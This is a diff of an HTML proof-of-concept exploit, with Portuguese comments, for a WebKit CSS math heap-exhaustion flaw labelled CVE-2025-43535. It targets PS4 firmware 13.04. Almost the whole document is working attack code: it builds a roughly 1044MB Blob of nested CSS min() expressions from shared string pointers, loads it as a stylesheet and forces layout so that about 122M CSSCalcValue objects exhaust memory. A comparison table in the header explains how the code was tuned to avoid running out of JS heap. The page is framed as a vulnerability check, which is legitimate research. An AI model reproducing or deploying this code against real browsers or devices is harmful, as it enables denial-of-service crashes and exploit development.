@@ -1,120 +1,265 @@
 <!DOCTYPE html>
+<!--
+  PoC FINAL: CVE-2025-43535
+  WebKit CSS Math — CSSCalcValue heap exhaustion
+
+  SOLUÇÃO: BASE_DEPTH = 16 (576KB) em vez de 24 (144MB)
+  ════════════════════════════════════════════════════════════
+  O SW do arquivo anterior usava depth=16 como base para
+  evitar acumulação de RAM. A mesma técnica funciona com
+  Blob direto — sem precisar de Service Worker.
+
+  Ao usar c16 como folha do Blob, os 1044MB são montados
+  via concatenações de ARRAYS DE PONTEIROS (< 50KB),
+  não de strings grandes.
+
+  COMPARAÇÃO:
+  ┌─────────────────┬────────────┬──────────────────────────┐
+  │ Versão          │ JS heap    │ Funciona no PS4           │
+  ├─────────────────┼────────────┼──────────────────────────┤
+  │ BASE=24         │ 144 MB     │ OOM antes de criar Blob   │
+  │ Service Worker  │ < 1 MB     │ SW não suportado no PS4   │
+  │ BASE=16 (este)  │ < 1 MB     │ ✓ Blob nativo, sem SW     │
+  └─────────────────┴────────────┴──────────────────────────┘
+
+  ESTRUTURA DO BLOB (1044MB):
+  ════════════════════════════════════════════════════════════
+  min(
+    sym(10),                        ← 576MB / 67M nós
+    min(                            ←
+      sym(9),                       ← 288MB / 34M nós
+      min( sym(8), sym(6) )         ← 144MB + 36MB / 21M nós
+    )
+  )
+  Total: ~1044MB · ~122M nós CSSCalcValue
+  Folha (sym(0)): c16 = 576KB — único objeto grande no JS heap
+  ════════════════════════════════════════════════════════════
+-->
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 (GitHub Otimizado)</title>
+<title>CVE-2025-43535</title>
 <style>
-  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
-  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
-  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+  body { background:#0a0a0a; color:#88ff88; font-family:monospace;
+         padding:16px; margin:0; font-size:13px; }
+  #log { background:#111; border:1px solid #2a4a2a; padding:10px;
+         height:72vh; overflow-y:auto; font-size:11px; line-height:1.7; }
+  .ok    { color:#00ff88 }
+  .fail  { color:#ff4444 }
+  .info  { color:#ffcc44 }
+  .warn  { color:#ff8844 }
+  .crash { color:#ff44ff; font-weight:bold }
+  .dim   { color:#336633 }
+  .bar   { background:#0a1a0a; border:1px solid #1a3a1a; color:#44aa44;
+           padding:6px 10px; margin-bottom:8px; font-size:11px; }
 </style>
 </head>
 <body>
-<div>CVE-2025-43535 · Micro Chunk Blob · PS4 FW 13.04</div>
+<div style="color:#aaffaa;font-size:12px;margin-bottom:6px">
+  CVE-2025-43535 · BASE=16 · JS heap &lt;1MB · Blob=1044MB · PS4 FW 13.04
+</div>
+<div class="bar" id="bar">Aguardando...</div>
 <div id="log"></div>
-<div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
+<div id="stage" style="position:absolute;top:-9999px;left:-9999px;
+                       width:1px;height:1px;overflow:hidden"></div>
 
 <script>
 "use strict";
 
-const L = (m, c) => {
-  const d = document.getElementById('log');
-  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
-  d.scrollTop = d.scrollHeight;
-};
+var logEl = document.getElementById('log');
+var barEl = document.getElementById('bar');
+var stage = document.getElementById('stage');
 
-// Gera apenas até à profundidade 16 (~576 KB de texto)
+function L(m, c) {
+  logEl.innerHTML += '<div class="'+(c||'dim')+'">' + m + '</div>';
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function bar(m) { barEl.textContent = m; }
+
+// ─────────────────────────────────────────────────────────────
+// buildDepth(16): constrói apenas 576KB — trivialmente seguro.
+// Esta é a ÚNICA string grande que existe no JS heap.
+// ─────────────────────────────────────────────────────────────
 function buildDepth(depth) {
-  let e = '1px';
-  for (let d = 1; d <= depth; d++) {
-    e = 'min(' + e + ',' + e + ')';
+  var e = '1px';
+  for (var d = 1; d <= depth; d++) {
+    var n = 'min(' + e + ',' + e + ')';
+    e = null; e = n;
   }
   return e;
 }
 
-async function run() {
-  L('A preparar o ataque de fragmentação minúscula (Micro Chunk)...', 'info');
-
-  // 1. Gera o bloco c16 (Custo de RAM praticamente zero para o JS)
-  L('A gerar bloco c16 (~576 KB)...', 'warn');
-  let c16;
-  try {
-    c16 = buildDepth(16);
-    L('Bloco c16 gerado com sucesso. RAM livre!', 'ok');
-  } catch(e) {
-    L('Falha no c16: ' + e, 'fail');
-    return;
+// ─────────────────────────────────────────────────────────────
+// sym(levels, leaf): retorna array PLANO de partes para o Blob.
+// Cada elemento é 'min(', ',', ')' ou a referência à string leaf.
+// Overhead do array: 3×(2^levels - 1) + 1 ponteiros ≈ tens of KB.
+// A string leaf NÃO é duplicada — cada elemento do array é
+// um ponteiro para o mesmo objeto em memória.
+// ─────────────────────────────────────────────────────────────
+function sym(levels, leaf) {
+  function p(l) {
+    if (l === 0) return [leaf];                          // 1 ponteiro para leaf
+    var i = p(l - 1);
+    return ['min('].concat(i, [','], i, [')']);          // concat = novo array, mesmos ponteiros
   }
-
-  // 2. Monta o Array do Blob com 1856 cópias do c16
-  // 1856 * 576 KB = ~1044 MB (Atinge os teus 121.7M de nós)
-  L('A compilar o Array de referências (Alvo: 1044MB)...', 'warn');
-  
-  let chunks = ['.t{width:min('];
-  const totalCopies = 1856; 
-  
-  for(let i = 0; i < totalCopies; i++) {
-    chunks.push(c16);
-    if (i < totalCopies - 1) {
-      chunks.push(',');
-    }
-  }
-  chunks.push(')}');
-
-  // 3. O Navegador cria o ficheiro nativo (Aqui ele usa a RAM libertada do JS)
-  L('A instruir o PS4 a construir o ficheiro Blob nativo...', 'info');
-  let url;
-  let blob;
-  try {
-    blob = new Blob(chunks, { type: 'text/css' });
-    url = URL.createObjectURL(blob);
-    L(`Blob criado: ${(blob.size / 1024 / 1024).toFixed(2)} MB ?`, 'ok');
-  } catch(e) {
-    L('OOM ao criar o Blob: ' + e, 'fail');
-    return;
-  }
-
-  // Limpa tudo o que ficou no JS para garantir fluxo máximo de rede
-  chunks = null;
-  c16 = null;
-
-  L('A injetar o CSS gigante no Parser C++ via rede interna...', 'warn');
-  
-  const el = document.createElement('div');
-  el.className = 't';
-  document.getElementById('stage').appendChild(el);
-
-  const link = document.createElement('link');
-  link.rel = 'stylesheet';
-  link.href = url;
-
-  // 4. O Gatilho
-  link.onload = () => {
-    L('Download para o C++ concluído sem erros de HTTPS!', 'ok');
-    L('A forçar o layout para engatilhar as 121 Milhões de instâncias...', 'crash');
-
-    setTimeout(() => {
-      try {
-        void el.offsetWidth;
-        L('Sobreviveu. A RAM suportou a carga.', 'fail');
-      } catch(e) {
-        L('Erro de layout: ' + e, 'fail');
-      }
-      
-      try { URL.revokeObjectURL(url); } catch(e) {}
-    }, 150);
-  };
-
-  link.onerror = () => {
-    // Se falhar agora, sabemos que o problema não era o tamanho das strings no JS
-    L('O WebKit do PS4 bloqueou o carregamento da URL interna.', 'fail');
-  };
-
-  document.head.appendChild(link);
+  return p(levels);
 }
 
-window.addEventListener('load', () => setTimeout(run, 500));
+// ─────────────────────────────────────────────────────────────
+// min_parts: combina dois arrays de partes em min(left, right).
+// Retorna array plano — sem copiar as strings.
+// ─────────────────────────────────────────────────────────────
+function min_parts(left, right) {
+  return ['min('].concat(left, [','], right, [')']);
+}
+
+// ─────────────────────────────────────────────────────────────
+// MAIN
+// ─────────────────────────────────────────────────────────────
+function run() {
+  L('CVE-2025-43535 · BASE=16 (576KB) · Blob=1044MB', 'info');
+  L('Threshold PS4 FW 13.04: >1021.5MB = crash', 'info');
+  L('', '');
+
+  // ── Fase 1: construir c16 (576KB) ────────────────────────
+  bar('[1/4] Construindo c16 (576KB)...');
+  L('[1/4] buildDepth(16) = 576KB...', 'warn');
+
+  setTimeout(function() {
+
+    var c16;
+    try {
+      c16 = buildDepth(16);
+      L('[1/4] c16: ' + (c16.length / 1024).toFixed(0) + 'KB ✓', 'ok');
+    } catch(e) {
+      L('[1/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
+    }
+
+    // ── Fase 2: montar partes do Blob (< 1MB de arrays) ──────
+    bar('[2/4] Montando partes do Blob...');
+    L('[2/4] Construindo árvore de ponteiros (~50KB de arrays)...', 'info');
+
+    setTimeout(function() {
+
+      var blobArray;
+      try {
+        //
+        // Estrutura 1044MB:
+        //   min( sym(10), min( sym(9), min(sym(8), sym(6)) ) )
+        //
+        // sym(10) = 576MB  (67M nós)
+        // sym(9)  = 288MB  (34M nós)
+        // sym(8)  = 144MB  (17M nós)
+        // sym(6)  =  36MB  ( 4M nós)
+        // Total   = 1044MB (122M nós)
+        //
+        var s10 = sym(10, c16);  // 576MB — array de ~3K ponteiros
+        var s9  = sym(9,  c16);  // 288MB — array de ~1.5K ponteiros
+        var s8  = sym(8,  c16);  // 144MB — array de ~768 ponteiros
+        var s6  = sym(6,  c16);  //  36MB — array de ~192 ponteiros
+
+        blobArray = ['.t{width:']
+          .concat(
+            min_parts(
+              s10,
+              min_parts(
+                s9,
+                min_parts(s8, s6)
+              )
+            )
+          )
+          .concat([';}']);
+
+        // c16 ainda está vivo como referência nos arrays acima — correto.
+        // Será coletado depois que o Blob for criado.
+
+        var totalPtrs = blobArray.length;
+        L('[2/4] Array de partes: ' + totalPtrs + ' elementos ✓', 'ok');
+        L('[2/4] JS heap: ~' + (totalPtrs * 8 / 1024).toFixed(0) +
+          'KB de ponteiros + 576KB de c16 ✓', 'ok');
+
+      } catch(e) {
+        L('[2/4] falhou: ' + e, 'fail'); bar('ERRO'); return;
+      }
+
+      // ── Fase 3: criar Blob e URL ──────────────────────────
+      bar('[3/4] Criando Blob 1044MB...');
+      L('[3/4] new Blob(array) → C++ heap...', 'warn');
+
+      setTimeout(function() {
+
+        var url, realBytes;
+        try {
+          var blob = new Blob(blobArray, { type: 'text/css' });
+          realBytes = blob.size;
+          url = URL.createObjectURL(blob);
+
+          // Liberar arrays e c16 do JS heap
+          blobArray = null;
+          c16 = null;
+
+          var mb = (realBytes / 1024 / 1024).toFixed(2);
+          var gb = (realBytes / 1024 / 1024 / 1024).toFixed(4);
+          L('[3/4] Blob: ' + realBytes + ' bytes', 'info');
+          L('[3/4]     = ' + mb + 'MB / ' + gb + 'GB ✓', 'ok');
+          L('[3/4] c16 + arrays liberados do JS heap ✓', 'ok');
+
+        } catch(e) {
+          blobArray = null; c16 = null;
+          L('[3/4] Blob falhou: ' + e, 'fail'); bar('ERRO'); return;
+        }
+
+        // ── Fase 4: disparar ─────────────────────────────────
+        bar('[4/4] Carregando — CSS parser recebe 1044MB...');
+        L('[4/4] <link href=blob:...>', 'warn');
+        L('[4/4] CSS parser cria ~122M objetos CSSCalcValue...', 'warn');
+        L('[4/4] ◀◀ SE O BROWSER FECHAR: CRASH = CVE PRESENTE ▶▶', 'crash');
+
+        var el = document.createElement('div');
+        el.className = 't';
+        el.style.cssText = 'position:absolute;visibility:hidden';
+        stage.appendChild(el);
+
+        var link = document.createElement('link');
+        link.rel  = 'stylesheet';
+        link.href = url;
+
+        link.onload = function() {
+          L('[4/4] Carregada ✓', 'ok');
+          setTimeout(function() {
+            try {
+              void el.offsetWidth;
+              var w = window.getComputedStyle(el).getPropertyValue('width');
+              L('[4/4] width="' + w + '" ✓', 'ok');
+            } catch(e) { L('[4/4] ' + e, 'fail'); }
+            try { URL.revokeObjectURL(url); } catch(e) {}
+            try { document.head.removeChild(link); } catch(e) {}
+            try { stage.removeChild(el); } catch(e) {}
+            L('', '');
+            L('═══════════════════════════════════════', 'warn');
+            L('CRASH = CVE-2025-43535 PRESENTE', 'crash');
+            L('SEM CRASH = PATCHED', 'ok');
+            L('═══════════════════════════════════════', 'warn');
+            bar('DONE');
+          }, 100);
+        };
+
+        link.onerror = function() {
+          L('blob: URL bloqueado (CSP) — usar servidor local', 'fail');
+          try { URL.revokeObjectURL(url); } catch(e) {}
+          try { document.head.removeChild(link); } catch(e) {}
+          try { stage.removeChild(el); } catch(e) {}
+          bar('CSP — usar servidor local');
+        };
+
+        document.head.appendChild(link);
+      }, 80);
+    }, 50);
+  }, 100);
+}
+
+window.addEventListener('load', function() { setTimeout(run, 200); });
 </script>
 </body>
 </html>
